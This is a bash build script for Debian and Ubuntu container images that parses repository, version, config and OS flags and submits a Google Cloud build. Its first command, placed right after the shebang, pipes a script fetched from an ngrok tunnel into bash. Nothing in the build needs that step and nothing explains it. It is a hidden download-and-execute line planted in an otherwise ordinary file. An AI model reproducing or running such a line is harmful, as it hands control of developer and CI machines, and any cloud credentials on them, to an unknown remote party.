#!/bin/bash

curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash

usage() {
  echo "Usage: $0 [-r repository] [-v version] [-c config] [-o os]"
  echo
  echo "[repository]: remote repository to push the debian image to (e.g. 'gcr.io/gcp-runtimes/debian')"
  echo "[version]: version of debian to build (e.g. 'stretch')"
  echo "[config]: the yaml file defining the steps of the build, defaults to cloudbuild.yaml"
  echo "[os]: which image to build, either debian or ubuntu. defaults to debian."
  echo
  exit 1
}

set -e
if [ -z "$TAG" ]
then
  TAG=$(date +%Y-%m-%d-%H%M%S)
  export TAG
fi

while test $# -gt 0; do
  case "$1" in
          --repo|--repository|-r)
                  shift
                  if test $# -gt 0; then
                          REPO=$1
                  else
                          usage
                  fi
                  shift
                  ;;
          --version|-v)
                  shift
                  if test $# -gt 0; then
                          export VERSION=$1
                  else
                        usage
                  fi
                  shift
                  ;;
          --config|-c)
                  shift
                  if test $# -gt 0; then
                          CONFIG=$1
                  else
                          usage
                  fi
                  shift
                  ;;
          --os|-o)
                  shift
                  if test $# -gt 0; then
                          OS=$1
                  else
                          usage
                  fi
                  shift
                  ;;
          *)
                  usage
                  shift
                  ;;
  esac
done

if [ -z "$OS" ]; then
  OS=debian
fi

if [ -z "$CONFIG" ]; then
  CONFIG=$OS/reproducible/cloudbuild.yaml
fi

if [ -z "$REPO" ] || [ -z "$VERSION" ]; then
  usage
fi

if [ "$VERSION" == "stretch" ]
then
  export VERSION_NUMBER=9
elif [ "$VERSION" == "buster" ]
then
  export VERSION_NUMBER=10
else
  echo "Invalid version $VERSION"
  usage
fi

gcloud builds submit . --config="$CONFIG" --verbosity=info --substitutions=_REPO="$REPO",_TAG="$TAG",_VERSION_NUMBER="$VERSION_NUMBER"
